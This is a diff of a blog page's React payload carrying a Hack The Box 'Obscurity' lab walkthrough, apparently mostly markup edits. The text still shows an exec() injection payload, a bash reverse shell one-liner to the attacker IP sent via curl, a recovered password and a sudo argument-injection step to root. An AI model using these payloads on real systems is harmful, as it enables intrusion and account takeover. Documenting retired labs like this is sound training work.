@@ -1,14 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-b:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-d:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-f:I[484,[],"OutletBoundary"]
-10:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Obscurity Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A leaked custom web-server source file exposed Python exec injection for a www-data shell, a known-plaintext attack recovered Robert's password, and argument injection in his sudoed BetterSSH script selected root as the execution user."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:28:32.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[17," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-obscurity-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Obscurity machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Obscurity machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/obscurity","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":["$L5","$L6"]}]]}],null,"$L7"]}],"$L8","$L9"],null,"$La"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","aside",null,{"className":"article-context","aria-label":"Article context","children":[["$","$Lb",null,{"headings":[{"id":"background","label":"Background"},{"id":"step-1-initial-reconnaissance-nmap","label":"Step 1: Initial Reconnaissance (Nmap)"},{"id":"step-2-web-enumeration","label":"Step 2: Web Enumeration"},{"id":"step-3-discovering-the-secret-directory","label":"Step 3: Discovering the Secret Directory"},{"id":"step-4-source-code-analysis","label":"Step 4: Source Code Analysis"},{"id":"step-5-exploiting-python-exec-injection","label":"Step 5: Exploiting Python exec() Injection"},{"id":"step-6-stabilizing-the-shell","label":"Step 6: Stabilizing the Shell"},{"id":"step-7-post-exploitation-enumeration","label":"Step 7: Post-Exploitation Enumeration"},{"id":"step-8-cryptographic-analysis-known-plaintext-attack","label":"Step 8: Cryptographic Analysis (Known-Plaintext Attack)"},{"id":"step-9-privilege-escalation-to-robert","label":"Step 9: Privilege Escalation to robert"},{"id":"step-10-root-privilege-escalation","label":"Step 10: Root Privilege Escalation"},{"id":"alternative-root-paths","label":"Alternative Root Paths"},{"id":"lessons-learned","label":"Lessons Learned"},{"id":"complete-command-reference","label":"Complete Command Reference"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6c5a33d5515bef07ca9ed3c33aefb71993b86d63/HTB-Obscurity.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 6c5a33d5515b",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Obscurity, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/obscurity","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"3 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}]
-c:T7989,<p><strong>Target IP:</strong> <code>10.129.227.178</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Linux</p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Obscurity Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A leaked custom web-server source file exposed Python exec injection for a www-data shell, a known-plaintext attack recovered Robert's password, and argument injection in his sudoed BetterSSH script selected root as the execution user."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Obscurity"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/obscurity","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Medium"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-obscurity-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Obscurity machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Obscurity machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/obscurity","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T801e,<p><strong>Target IP:</strong> <code>10.129.227.178</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Linux</p>
 <hr>
 
 
@@ -31,7 +37,7 @@ c:T7989,<p><strong>Target IP:</strong> <code>10.129.227.178</code><br><strong>At
 <hr>
 <h2 id="step-1-initial-reconnaissance-nmap">Step 1: Initial Reconnaissance (Nmap)</h2>
 
-<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.178
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.178
 nmap -p 22,8080 -sC -sV -oA scans/nmap 10.129.227.178
 </code></pre>
 
@@ -50,7 +56,7 @@ nmap -p 22,8080 -sC -sV -oA scans/nmap 10.129.227.178
 <hr>
 <h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>
 
-<pre><code class="language-bash" data-language="bash">curl http://10.129.227.178:8080
+<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">curl http://10.129.227.178:8080
 </code></pre>
 
 <p>Web applications are the most common attack surface. We need to understand what the application does, what technologies it uses, and whether it leaks any information.</p>
@@ -81,7 +87,7 @@ nmap -p 22,8080 -sC -sV -oA scans/nmap 10.129.227.178
 <hr>
 <h2 id="step-3-discovering-the-secret-directory">Step 3: Discovering the Secret Directory</h2>
 
-<pre><code class="language-bash" data-language="bash">grep dev /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &gt; dev_dirs
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">grep dev /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &gt; dev_dirs
 ffuf -u http://10.129.227.178:8080/FUZZ/SuperSecureServer.py -w dev_dirs -c
 </code></pre>
 
@@ -93,7 +99,7 @@ ffuf -u http://10.129.227.178:8080/FUZZ/SuperSecureServer.py -w dev_dirs -c
 
 <p>We're thinking: <em>"The developers are lazy. They probably used a simple, obvious name like 'dev', 'develop', 'development', or 'devel'. Do not waste time on 'admin', 'backup', or 'test' when we have a strong hint."</em></p>
 <h3 id="what-we-found-2">What We Found</h3>
-<pre><code>develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
+<pre tabindex="0" aria-label="Code or terminal block 4"><code>develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 </code></pre>
 <p>The secret directory is <code>/develop</code>.</p>
 
@@ -103,7 +109,7 @@ ffuf -u http://10.129.227.178:8080/FUZZ/SuperSecureServer.py -w dev_dirs -c
 <hr>
 <h2 id="step-4-source-code-analysis">Step 4: Source Code Analysis</h2>
 
-<pre><code class="language-bash" data-language="bash">wget http://10.129.227.178:8080/develop/SuperSecureServer.py
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">wget http://10.129.227.178:8080/develop/SuperSecureServer.py
 cat SuperSecureServer.py
 </code></pre>
 
@@ -119,7 +125,7 @@ cat SuperSecureServer.py
 </ul>
 <h3 id="the-vulnerability">The Vulnerability</h3>
 <p>In the <code>serveDoc()</code> method, we find:</p>
-<pre><code class="language-python" data-language="python">def serveDoc(self, path, docRoot):
+<pre tabindex="0" aria-label="python code or terminal block 6"><code class="language-python" data-language="python">def serveDoc(self, path, docRoot):
     path = urllib.parse.unquote(path)
     try:
         info = "output = 'Document: {}'" # Keep the output for later debug
@@ -134,13 +140,13 @@ cat SuperSecureServer.py
 </ol>
 <h3 id="the-developer-s-mistake">The Developer's Mistake</h3>
 <p>The developer wanted to create a debug string like:</p>
-<pre><code class="language-python" data-language="python">output = 'Document: /index.html'
+<pre tabindex="0" aria-label="python code or terminal block 7"><code class="language-python" data-language="python">output = 'Document: /index.html'
 </code></pre>
 <p>But they used <code>exec()</code> instead of simple assignment. If a user sends:</p>
-<pre><code>/'; os.system('id'); a='
+<pre tabindex="0" aria-label="Code or terminal block 8"><code>/'; os.system('id'); a='
 </code></pre>
 <p>The formatted string becomes:</p>
-<pre><code class="language-python" data-language="python">output = 'Document: '; os.system('id'); a=''
+<pre tabindex="0" aria-label="python code or terminal block 9"><code class="language-python" data-language="python">output = 'Document: '; os.system('id'); a=''
 </code></pre>
 <p>The <code>exec()</code> runs this as three separate Python statements:</p>
 <ol>
@@ -150,7 +156,7 @@ cat SuperSecureServer.py
 </ol>
 <h3 id="why-os-is-available">Why <code>os</code> Is Available</h3>
 <p>Notice at the top of the file:</p>
-<pre><code class="language-python" data-language="python">import os
+<pre tabindex="0" aria-label="python code or terminal block 10"><code class="language-python" data-language="python">import os
 </code></pre>
 <p>Because <code>os</code> is already imported into the script's namespace, our injected code can use it directly without needing to import it ourselves.</p>
 
@@ -161,10 +167,10 @@ cat SuperSecureServer.py
 <h2 id="step-5-exploiting-python-exec-injection">Step 5: Exploiting Python exec() Injection</h2>
 <h3 id="proof-of-concept-ping">Proof of Concept (Ping)</h3>
 <p><strong>Terminal 1 (Listener):</strong></p>
-<pre><code class="language-bash" data-language="bash">sudo tcpdump -i tun0 icmp
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">sudo tcpdump -i tun0 icmp
 </code></pre>
 <p><strong>Terminal 2 (Attack):</strong></p>
-<pre><code class="language-bash" data-language="bash">curl "http://10.129.227.178:8080/';os.system('ping%20-c%201%2010.10.16.84');'"
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">curl "http://10.129.227.178:8080/';os.system('ping%20-c%201%2010.10.16.84');'"
 </code></pre>
 <h3 id="why-we-test-with-ping-first">Why We Test with Ping First</h3>
 <p>Before we try to get a full shell, we use a <strong>blind command execution test</strong>. Why?</p>
@@ -186,14 +192,14 @@ cat SuperSecureServer.py
 <p>We're being methodical: <em>"Don't rush to a reverse shell. Confirm the primitive first. If the ping works, the shell will work. If the ping fails, I need to debug my payload syntax before I waste time on a listener."</em></p>
 <h3 id="getting-the-reverse-shell">Getting the Reverse Shell</h3>
 <p><strong>Terminal 1 (Listener):</strong></p>
-<pre><code class="language-bash" data-language="bash">nc -lvnp 443
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">nc -lvnp 443
 </code></pre>
 <p><strong>Terminal 2 (Attack):</strong></p>
-<pre><code class="language-bash" data-language="bash">curl "http://10.129.227.178:8080/';os.system('bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/10.10.16.84/443%200%3E&amp;1%22');'"
+<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">curl "http://10.129.227.178:8080/';os.system('bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/10.10.16.84/443%200%3E&amp;1%22');'"
 </code></pre>
 <h3 id="why-this-payload">Why This Payload?</h3>
 <p>We're using a <strong>bash reverse shell one-liner</strong>:</p>
-<pre><code class="language-bash" data-language="bash">bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1"
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1"
 </code></pre>
 <p>This creates an interactive bash session that redirects:</p>
 <ul>
@@ -208,7 +214,7 @@ cat SuperSecureServer.py
 <hr>
 <h2 id="step-6-stabilizing-the-shell">Step 6: Stabilizing the Shell</h2>
 
-<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Press Ctrl+Z
 stty raw -echo; fg
 reset
@@ -233,7 +239,7 @@ reset
 <hr>
 <h2 id="step-7-post-exploitation-enumeration">Step 7: Post-Exploitation Enumeration</h2>
 
-<pre><code class="language-bash" data-language="bash">cd /home/robert &amp;&amp; ls -la
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">cd /home/robert &amp;&amp; ls -la
 cat check.txt
 cat out.txt
 cat passwordreminder.txt
@@ -248,7 +254,7 @@ python3 SuperSecureCrypt.py -h
 <li>Scripts or applications with vulnerabilities</li>
 </ul>
 <h3 id="what-we-found-3">What We Found</h3>
-<pre><code>check.txt            - plaintext message
+<pre tabindex="0" aria-label="Code or terminal block 18"><code>check.txt            - plaintext message
 out.txt              - encrypted output
 passwordreminder.txt - encrypted password reminder
 SuperSecureCrypt.py  - the encryption program
@@ -265,7 +271,7 @@ user.txt             - the user flag (unreadable by www-data)
 <h2 id="step-8-cryptographic-analysis-known-plaintext-attack">Step 8: Cryptographic Analysis (Known-Plaintext Attack)</h2>
 <h3 id="understanding-the-encryption">Understanding the Encryption</h3>
 <p>Looking at <code>SuperSecureCrypt.py</code>:</p>
-<pre><code class="language-python" data-language="python">def encrypt(text, key):
+<pre tabindex="0" aria-label="python code or terminal block 19"><code class="language-python" data-language="python">def encrypt(text, key):
     keylen = len(key)
     keyPos = 0
     encrypted = ""
@@ -305,7 +311,7 @@ def decrypt(text, key):
 <li>They have been analyzed by cryptographers for decades</li>
 </ol>
 <p>This custom algorithm is just <strong>repeated addition</strong>. If you know any plaintext and its ciphertext, you can solve for the key:</p>
-<pre><code>key_char = (cipher_char - plain_char) % 255
+<pre tabindex="0" aria-label="Code or terminal block 20"><code>key_char = (cipher_char - plain_char) % 255
 </code></pre>
 <h3 id="the-attack-using-the-script-against-itself">The Attack: Using the Script Against Itself</h3>
 <p>We have:</p>
@@ -314,17 +320,17 @@ def decrypt(text, key):
 <li><code>out.txt</code> = ciphertext of check.txt</li>
 </ul>
 <p>If we "decrypt" <code>out.txt</code> using <code>check.txt</code> as the "key," the math works out to:</p>
-<pre><code>result = (cipher_char - plain_char) % 255 = key_char
+<pre tabindex="0" aria-label="Code or terminal block 21"><code>result = (cipher_char - plain_char) % 255 = key_char
 </code></pre>
 <p>So we run:</p>
-<pre><code class="language-bash" data-language="bash">python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o /tmp/key.txt
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o /tmp/key.txt
 cat /tmp/key.txt
 </code></pre>
 <p><strong>Output:</strong> <code>alexandrovichalexandrovichalexandrovich...</code></p>
 <p>The key is <strong><code>alexandrovich</code></strong>.</p>
 <h3 id="decrypting-the-password">Decrypting the Password</h3>
 <p>Now that we have the key:</p>
-<pre><code class="language-bash" data-language="bash">python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o /tmp/passwd.txt
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o /tmp/passwd.txt
 cat /tmp/passwd.txt
 </code></pre>
 <p><strong>Output:</strong> <code>SecThruObsFTW</code></p>
@@ -337,7 +343,7 @@ cat /tmp/passwd.txt
 <hr>
 <h2 id="step-9-privilege-escalation-to-robert">Step 9: Privilege Escalation to robert</h2>
 
-<pre><code class="language-bash" data-language="bash">su robert
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">su robert
 # Password: REDACTED
 cat /home/robert/user.txt
 </code></pre>
@@ -350,10 +356,10 @@ cat /home/robert/user.txt
 <hr>
 <h2 id="step-10-root-privilege-escalation">Step 10: Root Privilege Escalation</h2>
 <h3 id="checking-sudo-privileges">Checking sudo Privileges</h3>
-<pre><code class="language-bash" data-language="bash">sudo -l
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">sudo -l
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>User robert may run the following commands on obscure:
+<pre tabindex="0" aria-label="Code or terminal block 26"><code>User robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 </code></pre>
 <h3 id="why-this-is-interesting">Why This Is Interesting</h3>
@@ -368,14 +374,14 @@ cat /home/robert/user.txt
 <li>If authenticated, enters a loop that runs commands via <code>sudo -u [user]</code></li>
 </ol>
 <p>The critical code is:</p>
-<pre><code class="language-python" data-language="python">command = input(session['user'] + "@Obscure$ ")
+<pre tabindex="0" aria-label="python code or terminal block 27"><code class="language-python" data-language="python">command = input(session['user'] + "@Obscure$ ")
 cmd = ['sudo', '-u',  session['user']]
 cmd.extend(command.split(" "))
 proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 </code></pre>
 <h3 id="finding-the-vulnerability">Finding the Vulnerability</h3>
 <p>The script builds the command list as:</p>
-<pre><code class="language-python" data-language="python">cmd = ['sudo', '-u', 'robert']
+<pre tabindex="0" aria-label="python code or terminal block 28"><code class="language-python" data-language="python">cmd = ['sudo', '-u', 'robert']
 # Then extends with our input
 cmd = ['sudo', '-u', 'robert', '-u', 'root', 'cat', '/root/root.txt']
 </code></pre>
@@ -389,7 +395,7 @@ cmd = ['sudo', '-u', 'robert', '-u', 'root', 'cat', '/root/root.txt']
 <li><em>"Why does this work?"</em> Because the developer trusted user input to be a simple command, not a command with its own flags.</li>
 </ul>
 <h3 id="exploitation">Exploitation</h3>
-<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/SSH
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">mkdir -p /tmp/SSH
 sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 # Enter username: robert
 # Enter password: REDACTED
@@ -462,7 +468,7 @@ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 </ol>
 <hr>
 <h2 id="complete-command-reference">Complete Command Reference</h2>
-<pre><code class="language-bash" data-language="bash"># Step 1: Recon
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash"># Step 1: Recon
 nmap -p- --min-rate 10000 10.129.227.178
 nmap -p 22,8080 -sC -sV 10.129.227.178
 
@@ -506,9 +512,9 @@ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 # password: REDACTED
 # -u root cat /root/root.txt
 </code></pre>
-<hr>6:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$c"}}]
